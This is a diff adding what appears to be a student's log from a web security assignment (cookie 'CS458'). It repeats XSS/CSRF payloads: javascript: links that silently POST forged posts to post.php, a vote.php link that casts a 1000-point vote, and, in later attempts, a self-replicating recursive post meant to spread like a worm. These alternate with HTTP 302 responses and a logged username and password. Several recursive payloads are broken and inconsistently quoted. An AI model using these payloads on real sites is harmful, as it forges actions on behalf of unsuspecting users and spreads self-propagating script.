@@ -1,0 +1,587 @@
+1;
+test
+<a href="javascript:const XHR = new XMLHttpRequest();const FD  = new FormData();FD.append('title', 'very important');FD.append('content', 'This website is malicious');FD.append('type', 1);FD.append('form', 'content');XHR.open( 'POST', 'post.php' );XHR.send( FD );">2b</a>
+HTTP/1.1 302 Found
+Date: Sat, 14 Nov 2020 15:48:10 GMT
+Server: Apache/2.2.16 (Debian)
+X-Powered-By: PHP/5.3.3-7+squeeze14
+Set-Cookie: CS458=lcftdaupoag787i9lrn57vo6o2; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: index.php
+Vary: Accept-Encoding
+Content-Length: 18
+Content-Type: text/html
+
+alice
+password123
+HTTP/1.1 302 Found
+Date: Sat, 14 Nov 2020 15:48:10 GMT
+Server: Apache/2.2.16 (Debian)
+X-Powered-By: PHP/5.3.3-7+squeeze14
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: index.php
+Vary: Accept-Encoding
+Content-Length: 56
+Content-Type: text/html
+
+1
+alice's post
+<a href='vote.php?id=2&vote=1000'>7a</a>
+HTTP/1.1 302 Found
+Date: Sat, 14 Nov 2020 15:48:10 GMT
+Server: Apache/2.2.16 (Debian)
+X-Powered-By: PHP/5.3.3-7+squeeze14
+Set-Cookie: CS458=pi4okboc1lo12k17ni0rb7cdh1; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: index.php
+Vary: Accept-Encoding
+Content-Length: 18
+Content-Type: text/html
+
+alice
+password123
+1;
+test
+<a href="javascript:const XHR = new XMLHttpRequest();const FD  = new FormData();FD.append('title', 'new post haha');FD.append('content', 'you just created a post');FD.append('type', 1);FD.append('form', 'content');XHR.open( 'POST', 'post.php' );XHR.send( FD );">2b</a>
+HTTP/1.1 302 Found
+Date: Sat, 14 Nov 2020 15:50:04 GMT
+Server: Apache/2.2.16 (Debian)
+X-Powered-By: PHP/5.3.3-7+squeeze14
+Set-Cookie: CS458=av19n0cmni13otttnhtam7g9c2; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: index.php
+Vary: Accept-Encoding
+Content-Length: 18
+Content-Type: text/html
+
+alice
+password123
+HTTP/1.1 302 Found
+Date: Sat, 14 Nov 2020 15:50:04 GMT
+Server: Apache/2.2.16 (Debian)
+X-Powered-By: PHP/5.3.3-7+squeeze14
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: index.php
+Vary: Accept-Encoding
+Content-Length: 56
+Content-Type: text/html
+
+1
+alice's post
+<a href='vote.php?id=2&vote=1000'>7a</a>
+1;
+test
+<a href="javascript:const XHR = new XMLHttpRequest();const FD  = new FormData();FD.append('title', 'new post haha');FD.append('content', 'you just created a post');FD.append('type', 1);FD.append('form', 'content');XHR.open( 'POST', 'post.php' );XHR.send( FD );">7b</a>
+HTTP/1.1 302 Found
+Date: Sat, 14 Nov 2020 16:08:26 GMT
+Server: Apache/2.2.16 (Debian)
+X-Powered-By: PHP/5.3.3-7+squeeze14
+Set-Cookie: CS458=jt6ev7cv6nrlnou1o39f5mo4q0; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: index.php
+Vary: Accept-Encoding
+Content-Length: 18
+Content-Type: text/html
+
+alice
+password123
+HTTP/1.1 302 Found
+Date: Sat, 14 Nov 2020 16:08:26 GMT
+Server: Apache/2.2.16 (Debian)
+X-Powered-By: PHP/5.3.3-7+squeeze14
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: index.php
+Vary: Accept-Encoding
+Content-Length: 56
+Content-Type: text/html
+
+1
+alice's post
+<a href='vote.php?id=2&vote=1000'>7a</a>
+1;
+test
+<a href="javascript:const XHR = new XMLHttpRequest();const FD  = new FormData();FD.append('title', 'new post haha');FD.append('content', 'you just created a post');FD.append('type', 1);FD.append('form', 'content');XHR.open( 'POST', 'post.php' );XHR.send( FD );">7b</a>
+HTTP/1.1 302 Found
+Date: Sat, 14 Nov 2020 16:10:04 GMT
+Server: Apache/2.2.16 (Debian)
+X-Powered-By: PHP/5.3.3-7+squeeze14
+Set-Cookie: CS458=dde36uugkt7ornpmkh65isdvp5; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: index.php
+Vary: Accept-Encoding
+Content-Length: 18
+Content-Type: text/html
+
+alice
+password123
+HTTP/1.1 302 Found
+Date: Sat, 14 Nov 2020 16:10:04 GMT
+Server: Apache/2.2.16 (Debian)
+X-Powered-By: PHP/5.3.3-7+squeeze14
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: index.php
+Vary: Accept-Encoding
+Content-Length: 56
+Content-Type: text/html
+
+1
+alice's post
+<a href='vote.php?id=2&vote=1000'>7a</a>
+1;
+you can create new post
+<a href="javascript:const XHR = new XMLHttpRequest();const FD  = new FormData();FD.append('title', 'new post haha');FD.append('content', 'you just created a post');FD.append('type', 1);FD.append('form', 'content');XHR.open( 'POST', 'post.php' );XHR.send( FD );">7b</a>
+HTTP/1.1 302 Found
+Date: Sat, 14 Nov 2020 16:55:19 GMT
+Server: Apache/2.2.16 (Debian)
+X-Powered-By: PHP/5.3.3-7+squeeze14
+Set-Cookie: CS458=eoue4hjcvihtd28deiv5a14bp4; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: index.php
+Vary: Accept-Encoding
+Content-Length: 18
+Content-Type: text/html
+
+alice
+password123
+HTTP/1.1 302 Found
+Date: Sat, 14 Nov 2020 16:55:19 GMT
+Server: Apache/2.2.16 (Debian)
+X-Powered-By: PHP/5.3.3-7+squeeze14
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: index.php
+Vary: Accept-Encoding
+Content-Length: 56
+Content-Type: text/html
+
+1
+alice's post
+<a href='vote.php?id=2&vote=1000'>7a</a>
+1;
+you can create new post
+<a href="javascript:const XHR = new XMLHttpRequest();const FD  = new FormData();FD.append('title', 'new post haha');FD.append('content', 'you just created a post');FD.append('type', 1);FD.append('form', 'content');XHR.open( 'POST', 'post.php' );XHR.send( FD );">7b</a>
+1;
+recursive post
+<a href="const XHR = new XMLHttpRequest();
+const FD  = new FormData();FD.append('title', 'recursive post');var a = "<a id=1929 href="javascript:const XHR = new XMLHttpRequest();const FD  = new FormData();FD.append('title', 'new post haha');FD.append('content', '<a href=\'javascript:document.getElementById(1929).click()\'>7c</a>');FD.append('type', 1);FD.append('form', 'content');XHR.open( 'POST', 'post.php' );XHR.send( FD );">7c</a>";FD.append('content', a);FD.append('type', 1);FD.append('form', 'content');XHR.open( 'POST', 'post.php' );XHR.send( FD );>7c</a>
+HTTP/1.1 302 Found
+Date: Sat, 14 Nov 2020 16:57:54 GMT
+Server: Apache/2.2.16 (Debian)
+X-Powered-By: PHP/5.3.3-7+squeeze14
+Set-Cookie: CS458=5i3jjisfrgdoqav516v6fq3676; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: index.php
+Vary: Accept-Encoding
+Content-Length: 18
+Content-Type: text/html
+
+alice
+password123
+HTTP/1.1 302 Found
+Date: Sat, 14 Nov 2020 16:57:54 GMT
+Server: Apache/2.2.16 (Debian)
+X-Powered-By: PHP/5.3.3-7+squeeze14
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: index.php
+Vary: Accept-Encoding
+Content-Length: 56
+Content-Type: text/html
+
+1
+alice's post
+<a href='vote.php?id=2&vote=1000'>7a</a>
+1;
+you can create new post
+<a href="javascript:const XHR = new XMLHttpRequest();const FD  = new FormData();FD.append('title', 'new post haha');FD.append('content', 'you just created a post');FD.append('type', 1);FD.append('form', 'content');XHR.open( 'POST', 'post.php' );XHR.send( FD );">7b</a>
+1;
+recursive post
+<a href="const XHR = new XMLHttpRequest();
+const FD  = new FormData();FD.append('title', 'recursive post');var a = "<a id=1929 href="javascript:const XHR = new XMLHttpRequest();const FD  = new FormData();FD.append('title', 'new post haha');FD.append('content', '<a href=\'javascript:document.getElementById(1929).click()\'>7c</a>');FD.append('type', 1);FD.append('form', 'content');XHR.open( 'POST', 'post.php' );XHR.send( FD );>7c</a>;FD.append('content', a);FD.append('type', 1);FD.append('form', 'content');XHR.open( 'POST', 'post.php' );XHR.send( FD );>7c</a>
+HTTP/1.1 302 Found
+Date: Sat, 14 Nov 2020 16:59:17 GMT
+Server: Apache/2.2.16 (Debian)
+X-Powered-By: PHP/5.3.3-7+squeeze14
+Set-Cookie: CS458=eia97tu9pre9hkoh0vqjb0i110; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: index.php
+Vary: Accept-Encoding
+Content-Length: 18
+Content-Type: text/html
+
+alice
+password123
+HTTP/1.1 302 Found
+Date: Sat, 14 Nov 2020 16:59:17 GMT
+Server: Apache/2.2.16 (Debian)
+X-Powered-By: PHP/5.3.3-7+squeeze14
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: index.php
+Vary: Accept-Encoding
+Content-Length: 56
+Content-Type: text/html
+
+1
+alice's post
+<a href='vote.php?id=2&vote=1000'>7a</a>
+1;
+you can create new post
+<a href="javascript:const XHR = new XMLHttpRequest();const FD  = new FormData();FD.append('title', 'new post haha');FD.append('content', 'you just created a post');FD.append('type', 1);FD.append('form', 'content');XHR.open( 'POST', 'post.php' );XHR.send( FD );">7b</a>
+1;
+recursive post
+<a href="const XHR = new XMLHttpRequest();
+const FD  = new FormData();FD.append('title', 'recursive post');var a = "<a id=1929 href="javascript:const XHR = new XMLHttpRequest();const FD  = new FormData();FD.append('title', 'new post haha');FD.append('content', '<a href=\'javascript:document.getElementById(1929).click()\'>7c</a>');FD.append('type', 1);FD.append('form', 'content');XHR.open( 'POST', 'post.php' );XHR.send( FD );>7c</a>;FD.append('content', a);FD.append('type', 1);FD.append('form', 'content');XHR.open( 'POST', 'post.php' );XHR.send( FD );">7c</a>
+HTTP/1.1 302 Found
+Date: Sat, 14 Nov 2020 17:00:02 GMT
+Server: Apache/2.2.16 (Debian)
+X-Powered-By: PHP/5.3.3-7+squeeze14
+Set-Cookie: CS458=lmohejs646cgc0ef6f8e44db40; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: index.php
+Vary: Accept-Encoding
+Content-Length: 18
+Content-Type: text/html
+
+alice
+password123
+HTTP/1.1 302 Found
+Date: Sat, 14 Nov 2020 17:00:02 GMT
+Server: Apache/2.2.16 (Debian)
+X-Powered-By: PHP/5.3.3-7+squeeze14
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: index.php
+Vary: Accept-Encoding
+Content-Length: 56
+Content-Type: text/html
+
+1
+alice's post
+<a href='vote.php?id=2&vote=1000'>7a</a>
+1;
+you can create new post
+<a href="javascript:const XHR = new XMLHttpRequest();const FD  = new FormData();FD.append('title', 'new post haha');FD.append('content', 'you just created a post');FD.append('type', 1);FD.append('form', 'content');XHR.open( 'POST', 'post.php' );XHR.send( FD );">7b</a>
+1;
+recursive post
+<a href="javascript:const XHR = new XMLHttpRequest();
+const FD  = new FormData();FD.append('title', 'recursive post');var a = "<a id=1929 href="javascript:const XHR = new XMLHttpRequest();const FD  = new FormData();FD.append('title', 'new post haha');FD.append('content', '<a href=\'javascript:document.getElementById(1929).click()\'>7c</a>');FD.append('type', 1);FD.append('form', 'content');XHR.open( 'POST', 'post.php' );XHR.send( FD );>7c</a>;FD.append('content', a);FD.append('type', 1);FD.append('form', 'content');XHR.open( 'POST', 'post.php' );XHR.send( FD );">7c</a>
+HTTP/1.1 302 Found
+Date: Sat, 14 Nov 2020 17:02:53 GMT
+Server: Apache/2.2.16 (Debian)
+X-Powered-By: PHP/5.3.3-7+squeeze14
+Set-Cookie: CS458=dljp9f0ttiadhu08120kqgp874; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: index.php
+Vary: Accept-Encoding
+Content-Length: 18
+Content-Type: text/html
+
+alice
+password123
+HTTP/1.1 302 Found
+Date: Sat, 14 Nov 2020 17:02:53 GMT
+Server: Apache/2.2.16 (Debian)
+X-Powered-By: PHP/5.3.3-7+squeeze14
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: index.php
+Vary: Accept-Encoding
+Content-Length: 56
+Content-Type: text/html
+
+1
+alice's post
+<a href='vote.php?id=2&vote=1000'>7a</a>
+1;
+you can create new post
+<a href="javascript:const XHR = new XMLHttpRequest();const FD  = new FormData();FD.append('title', 'new post haha');FD.append('content', 'you just created a post');FD.append('type', 1);FD.append('form', 'content');XHR.open( 'POST', 'post.php' );XHR.send( FD );">7b</a>
+1;
+recursive post
+<a id=1929 href="javascript:const XHR = new XMLHttpRequest();
+const FD  = new FormData();FD.append('title', 'recursive post');var a = \'<a href=\'javascript:const XHR = new XMLHttpRequest();const FD  = new FormData();FD.append('title', 'new post haha');FD.append('content', '<a href=\'javascript:document.getElementById(1929).click()\'>7c</a>');FD.append('type', 1);FD.append('form', 'content');XHR.open( 'POST', 'post.php' );XHR.send( FD );>7c</a>;FD.append('content', a);FD.append('type', 1);FD.append('form', 'content');XHR.open( 'POST', 'post.php' );XHR.send( FD );">7c</a>
+HTTP/1.1 302 Found
+Date: Sat, 14 Nov 2020 17:05:06 GMT
+Server: Apache/2.2.16 (Debian)
+X-Powered-By: PHP/5.3.3-7+squeeze14
+Set-Cookie: CS458=osefud9a0ekuosh4f3mlfq8rc4; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: index.php
+Vary: Accept-Encoding
+Content-Length: 18
+Content-Type: text/html
+
+alice
+password123
+HTTP/1.1 302 Found
+Date: Sat, 14 Nov 2020 17:05:06 GMT
+Server: Apache/2.2.16 (Debian)
+X-Powered-By: PHP/5.3.3-7+squeeze14
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: index.php
+Vary: Accept-Encoding
+Content-Length: 56
+Content-Type: text/html
+
+1
+alice's post
+<a href='vote.php?id=2&vote=1000'>7a</a>
+1;
+you can create new post
+<a href="javascript:const XHR = new XMLHttpRequest();const FD  = new FormData();FD.append('title', 'new post haha');FD.append('content', 'you just created a post');FD.append('type', 1);FD.append('form', 'content');XHR.open( 'POST', 'post.php' );XHR.send( FD );">7b</a>
+1;
+recursive post
+<a id=1929 href="javascript:const XHR = new XMLHttpRequest();const FD  = new FormData();FD.append('title', 'recursive post');var a = \'<a href=\'javascript:const XHR = new XMLHttpRequest();const FD  = new FormData();FD.append('title', 'new post haha');FD.append('content', '<a href=\'javascript:document.getElementById(1929).click()\'>7c</a>');FD.append('type', 1);FD.append('form', 'content');XHR.open( 'POST', 'post.php' );XHR.send( FD );>7c</a>;FD.append('content', a);FD.append('type', 1);FD.append('form', 'content');XHR.open( 'POST', 'post.php' );XHR.send( FD );">7c</a>
+HTTP/1.1 302 Found
+Date: Sat, 14 Nov 2020 17:06:47 GMT
+Server: Apache/2.2.16 (Debian)
+X-Powered-By: PHP/5.3.3-7+squeeze14
+Set-Cookie: CS458=rh0ckncu8k69v8hgf9toli59q3; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: index.php
+Vary: Accept-Encoding
+Content-Length: 18
+Content-Type: text/html
+
+alice
+password123
+HTTP/1.1 302 Found
+Date: Sat, 14 Nov 2020 17:06:47 GMT
+Server: Apache/2.2.16 (Debian)
+X-Powered-By: PHP/5.3.3-7+squeeze14
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: index.php
+Vary: Accept-Encoding
+Content-Length: 56
+Content-Type: text/html
+
+1
+alice's post
+<a href='vote.php?id=2&vote=1000'>7a</a>
+1;
+you can create new post
+<a href="javascript:const XHR = new XMLHttpRequest();const FD  = new FormData();FD.append('title', 'new post haha');FD.append('content', 'you just created a post');FD.append('type', 1);FD.append('form', 'content');XHR.open( 'POST', 'post.php' );XHR.send( FD );">7b</a>
+1;
+recursive post
+<a id=1929 href="javascript:const XHR = new XMLHttpRequest();const FD  = new FormData();FD.append('title', 'recursive post');var a = '<a href=\'javascript:const XHR = new XMLHttpRequest();const FD  = new FormData();FD.append('title', 'new post haha');FD.append('content', '<a href=\'javascript:document.getElementById(1929).click()\'>7c</a>');FD.append('type', 1);FD.append('form', 'content');XHR.open( 'POST', 'post.php' );XHR.send( FD );>7c</a>;FD.append('content', a);FD.append('type', 1);FD.append('form', 'content');XHR.open( 'POST', 'post.php' );XHR.send( FD );">7c</a>
+HTTP/1.1 302 Found
+Date: Sat, 14 Nov 2020 17:08:42 GMT
+Server: Apache/2.2.16 (Debian)
+X-Powered-By: PHP/5.3.3-7+squeeze14
+Set-Cookie: CS458=e7ut068cb72148acf765guhmi0; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: index.php
+Vary: Accept-Encoding
+Content-Length: 18
+Content-Type: text/html
+
+alice
+password123
+HTTP/1.1 302 Found
+Date: Sat, 14 Nov 2020 17:08:42 GMT
+Server: Apache/2.2.16 (Debian)
+X-Powered-By: PHP/5.3.3-7+squeeze14
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: index.php
+Vary: Accept-Encoding
+Content-Length: 56
+Content-Type: text/html
+
+1
+alice's post
+<a href='vote.php?id=2&vote=1000'>7a</a>
+1;
+you can create new post
+<a href="javascript:const XHR = new XMLHttpRequest();const FD  = new FormData();FD.append('title', 'new post haha');FD.append('content', 'you just created a post');FD.append('type', 1);FD.append('form', 'content');XHR.open( 'POST', 'post.php' );XHR.send( FD );">7b</a>
+1;
+recursive post
+<a id=1929 href="javascript:const XHR = new XMLHttpRequest();const FD  = new FormData();FD.append('title', 'recursive post');const FD  = new FormData();FD.append('title', 'new post haha');FD.append('content', '<a href=\'javascript:document.getElementById(1929).click()\'>7c</a>');FD.append('type', 1);FD.append('form', 'content');XHR.open( 'POST', 'post.php' );XHR.send( FD );>7c</a>;FD.append('content', a);FD.append('type', 1);FD.append('form', 'content');XHR.open( 'POST', 'post.php' );XHR.send( FD );">7c</a>
+HTTP/1.1 302 Found
+Date: Sat, 14 Nov 2020 17:13:02 GMT
+Server: Apache/2.2.16 (Debian)
+X-Powered-By: PHP/5.3.3-7+squeeze14
+Set-Cookie: CS458=90qs8p727ealoic8pgu9dq4jj4; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: index.php
+Vary: Accept-Encoding
+Content-Length: 18
+Content-Type: text/html
+
+alice
+password123
+HTTP/1.1 302 Found
+Date: Sat, 14 Nov 2020 17:13:02 GMT
+Server: Apache/2.2.16 (Debian)
+X-Powered-By: PHP/5.3.3-7+squeeze14
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: index.php
+Vary: Accept-Encoding
+Content-Length: 56
+Content-Type: text/html
+
+1
+alice's post
+<a href='vote.php?id=2&vote=1000'>7a</a>
+1;
+you can create new post
+<a href="javascript:const XHR = new XMLHttpRequest();const FD  = new FormData();FD.append('title', 'new post haha');FD.append('content', 'you just created a post');FD.append('type', 1);FD.append('form', 'content');XHR.open( 'POST', 'post.php' );XHR.send( FD );">7b</a>
+1;
+recursive post
+<a id=1929 href="javascript:const XHR = new XMLHttpRequest();const FD  = new FormData();FD.append('title', 'recursive post');const FD  = new FormData();FD.append('title', 'new post haha');FD.append('content', '<a href=\'javascript:document.getElementById(1929).click()\'>7c</a>');FD.append('type', 1);FD.append('form', 'content');XHR.open( 'POST', 'post.php' );XHR.send( FD );
+HTTP/1.1 302 Found
+Date: Sat, 14 Nov 2020 17:14:35 GMT
+Server: Apache/2.2.16 (Debian)
+X-Powered-By: PHP/5.3.3-7+squeeze14
+Set-Cookie: CS458=0gma20lsv1geh5g5g4l4h9aei3; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: index.php
+Vary: Accept-Encoding
+Content-Length: 18
+Content-Type: text/html
+
+alice
+password123
+HTTP/1.1 302 Found
+Date: Sat, 14 Nov 2020 17:14:35 GMT
+Server: Apache/2.2.16 (Debian)
+X-Powered-By: PHP/5.3.3-7+squeeze14
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: index.php
+Vary: Accept-Encoding
+Content-Length: 56
+Content-Type: text/html
+
+1
+alice's post
+<a href='vote.php?id=2&vote=1000'>7a</a>
+1;
+you can create new post
+<a href="javascript:const XHR = new XMLHttpRequest();const FD  = new FormData();FD.append('title', 'new post haha');FD.append('content', 'you just created a post');FD.append('type', 1);FD.append('form', 'content');XHR.open( 'POST', 'post.php' );XHR.send( FD );">7b</a>
+1;
+recursive post
+<a id=1929 href="javascript:const XHR = new XMLHttpRequest();const FD  = new FormData();FD.append('title', 'recursive post');const FD  = new FormData();FD.append('title', 'new post haha');FD.append('content', '<a href=\'javascript:document.getElementById(1929).click()\'>7c</a>');FD.append('type', 1);FD.append('form', 'content');XHR.open( 'POST', 'post.php' );XHR.send( FD );">7c</a>
+HTTP/1.1 302 Found
+Date: Sat, 14 Nov 2020 17:16:09 GMT
+Server: Apache/2.2.16 (Debian)
+X-Powered-By: PHP/5.3.3-7+squeeze14
+Set-Cookie: CS458=a65gutdk0h5omounomoo5bhre5; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: index.php
+Vary: Accept-Encoding
+Content-Length: 18
+Content-Type: text/html
+
+alice
+password123
+HTTP/1.1 302 Found
+Date: Sat, 14 Nov 2020 17:16:09 GMT
+Server: Apache/2.2.16 (Debian)
+X-Powered-By: PHP/5.3.3-7+squeeze14
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: index.php
+Vary: Accept-Encoding
+Content-Length: 56
+Content-Type: text/html
+
+1
+alice's post
+<a href='vote.php?id=2&vote=1000'>7a</a>
+1;
+you can create new post
+<a href="javascript:const XHR = new XMLHttpRequest();const FD  = new FormData();FD.append('title', 'new post haha');FD.append('content', 'you just created a post');FD.append('type', 1);FD.append('form', 'content');XHR.open( 'POST', 'post.php' );XHR.send( FD );">7b</a>
+1;
+recursive post
+<a id=1929 href="javascript:const XHR = new XMLHttpRequest();const FD  = new FormData();FD.append('title', 'new post haha');FD.append('content', '<a href=\'javascript:document.getElementById(1929).click()\'>7c</a>');FD.append('type', 1);FD.append('form', 'content');XHR.open( 'POST', 'post.php' );XHR.send( FD );">7c</a>
+HTTP/1.1 302 Found
+Date: Sat, 14 Nov 2020 17:22:26 GMT
+Server: Apache/2.2.16 (Debian)
+X-Powered-By: PHP/5.3.3-7+squeeze14
+Set-Cookie: CS458=pdavfls97s165kehpedtjbaj26; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: index.php
+Vary: Accept-Encoding
+Content-Length: 18
+Content-Type: text/html
+
+alice
+password123
+HTTP/1.1 302 Found
+Date: Sat, 14 Nov 2020 17:22:26 GMT
+Server: Apache/2.2.16 (Debian)
+X-Powered-By: PHP/5.3.3-7+squeeze14
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: index.php
+Vary: Accept-Encoding
+Content-Length: 56
+Content-Type: text/html
+
+1
+alice's post
+<a href='vote.php?id=2&vote=1000'>7a</a>
+1;
+you can create new post
+<a href="javascript:const XHR = new XMLHttpRequest();const FD  = new FormData();FD.append('title', 'new post haha');FD.append('content', 'you just created a post');FD.append('type', 1);FD.append('form', 'content');XHR.open( 'POST', 'post.php' );XHR.send( FD );">7b</a>
+1;
+recursive post
+<a id=1929 href="javascript:const XHR = new XMLHttpRequest();const FD  = new FormData();FD.append('title', 'new post haha');FD.append('content', '<a href=\'javascript:document.getElementById(1929).click()\'>7c</a>');FD.append('type', 1);FD.append('form', 'content');XHR.open( 'POST', 'post.php' );XHR.send( FD );">7c</a>
